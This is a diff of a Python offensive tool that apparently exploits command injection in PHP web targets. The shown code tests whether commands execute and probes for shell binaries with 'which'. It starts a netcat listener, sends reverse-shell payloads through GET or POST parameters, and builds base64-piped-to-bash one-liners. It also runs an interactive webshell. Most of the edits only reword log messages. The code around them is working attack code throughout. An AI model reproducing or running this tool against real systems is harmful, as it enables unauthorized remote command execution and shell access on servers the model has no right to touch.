@@ -140,15 +140,13 @@ def avalability_check(target , type , method , param , data):
 #			proxydict = {'http' : 'http://127.0.0.1:8080'}
 			data = {param : data.replace(type , 'id')}
 			r = requests.post(target , data=data)
-
-		ap("Address is alive")
-		if r.status_code == 200: # Compares the status code to check the availability of the .php file
+		if r.status_code != 404: # Compares the status code to check the availability of the .php file
 			if method == "GET":
-				ap(f"Found : {splitted_php_param[0]}")
+				ainfo(f"Found : {splitted_php_param[0]}")
 			elif method == "POST":
-				ap(f"Found : {splitted_target[-1]}")
+				ainfo(f"Found : {splitted_target[-1]}")
 			if 'uid' in r.text and 'gid' in r.text and 'groups' in r.text: #checks if uid, gid and groups are available on the response
-				ap("Command executed successfully") 
+				ainfo("Testing command execution") 
 				return True
 			else:
 				aerr("Command exection failed.")
@@ -160,8 +158,8 @@ def avalability_check(target , type , method , param , data):
 					aerr("Exitting...")
 				return False
 				 # If target address and .php file is available it returns True
-		elif r.status_code == 404:
-			aerr(f"Not found : {splitted_target[-1]} ")
+		else:
+			aerr(f"Not found : {splitted_php_param[0]} ")
 			return False
 	except:
 		aerr("Address isn't alive")
@@ -174,17 +172,17 @@ def avalability_check(target , type , method , param , data):
 #=================================================================================================================================================	
 def payload_base_test(target , payloadtype , method , param, data ):
 	payloadtype = list(map(str , payloadtype.split("-")))[0] #splits the payload base from the payloadtype as bash-196 which wlso uses bash, so we have to split bash-196 using '-' inorder to get the base
-	ainfo(f"Testing the avalability of {payloadtype} on the target")
 	if method == "GET":
+		ainfo(f"Testing the avalability of {payloadtype} on the target")
 		r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}")#sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
 	elif method == "POST":
+		ainfo(f"Testing the avalability of {payloadtype} on the target")
 		data = {param : data.replace("REV" , f"which {payloadtype}")}
 		r = requests.post(target , data)
 	if r.text != "": # This line checks if the response is not blank, if it blanks that means base isn't available
-		ap(f"{payloadtype} is available")
 		return True
 	else:
-		aerr(f"{payloadtype} isn't available on the target.Try another one")
+		aerr(f"{payloadtype} isn't available on the target system. Try another one. use '--payloads' to list payloads.")
 		aerr("Exitting...")
 		return False
 		quit()
@@ -202,9 +200,9 @@ def send_payload(target , payload ,fmt , port , method, param ,data,nolstn=False
 					ap("Payload sent successfully")
 					sys.exit()
 			else:
-				ainfo("Starting listener")
+				ainfo("Starting the listener")
 				Popen(["nc","-lvnp",port])
-				ainfo("Sending payload. Good luck :)")
+				ainfo("Sending the payload. Good luck :)\n")
 				requests.get(target.replace("REV" , urllib.parse.quote_plus(payload)))
 		elif method.upper() == "POST":
 			data = {param : data.replace("REV" , payload) }
@@ -232,10 +230,9 @@ def send_payload(target , payload ,fmt , port , method, param ,data,nolstn=False
 #=================================================================================================================================================	
 def payloads(fmt , ip , port , method):
 	port = str(port)
-	ainfo("Generating Payload")
+	ainfo("Generating the Payload")
 	if fmt in list(payloads_dict.keys()): # This checks if the given format is available on the payload or not
 		payload =  payloads_dict.get(fmt).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))
-		ap("Payload generated successfully")
 		return payload
 	else:
 		aerr("Payload format not found")
@@ -296,7 +293,7 @@ def webshell_help(cmd=None):
 def webshell(target ,method , param , data):
 	try:
 		ainfo("Use 'help' to see cshell-web commands")
-		ap("Spawning prompt..")
+		ainfo("Spawning prompt..")
 		time.sleep(2)
 		raw_data = data
 		if method == "GET":
@@ -312,8 +309,6 @@ def webshell(target ,method , param , data):
 				pwd = line.split("[OUTPUT_START][PWD_START]")[1].split("[PWD_END][HOSTNAME_START]")[0]
 				hostname = line.split("[PWD_END][HOSTNAME_START]")[1].split("[HOSTNAME_END][WHOAMI_START]")[0]
 				whoami = line.split("[HOSTNAME_END][WHOAMI_START]")[1].split("[WHOAMI_END][OUTPUT_END]")[0]
-		
-		print("\x1b[2J\x1b[H",end="") #This clears the screen
 		readline.parse_and_bind('tab: complete')
 		readline.parse_and_bind('set editing-mode vi')
 		while 1:
@@ -374,7 +369,7 @@ def listener(ifname , port , payload_type='bash' , nolistener=True , base64encod
     except ValueError:
         ip = get_ip_address(ifname)
     if payload_type in list(payloads_dict.keys()):
-        ainfo("Generating payload")
+        ainfo("Generating the payload")
         payload = payloads_dict.get(payload_type).replace("\t" , "").replace("127.0.0.1" , ip).replace("1337" , str(port)) #generates the payload
     else:
         aerr("Payload format not found")
@@ -387,10 +382,10 @@ def listener(ifname , port , payload_type='bash' , nolistener=True , base64encod
         b64_encoded_payload = b64_enc.decode('ascii')
         payload = f"echo {b64_encoded_payload}|base64 -d|bash"
     pc.copy(payload) #copy the payload into the clipboard
-    ap(f"Payload => {payload}")
-    ap("Payload has been copied to your clipboard")
+    ainfo(f"Payload : {payload}")
+    ainfo("Payload has been copied to your clipboard")
     if not nolistener: #starts the listener
-        ainfo("Starting netcat listener")
+        ainfo("Starting the listener\n")
         os.system(f"nc -lvnp {port}")
 
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -568,3 +563,4 @@ def main():
 		myparser.print_help()
 
 #====================================================================< Function Ends Here >=================================================================================
+main()
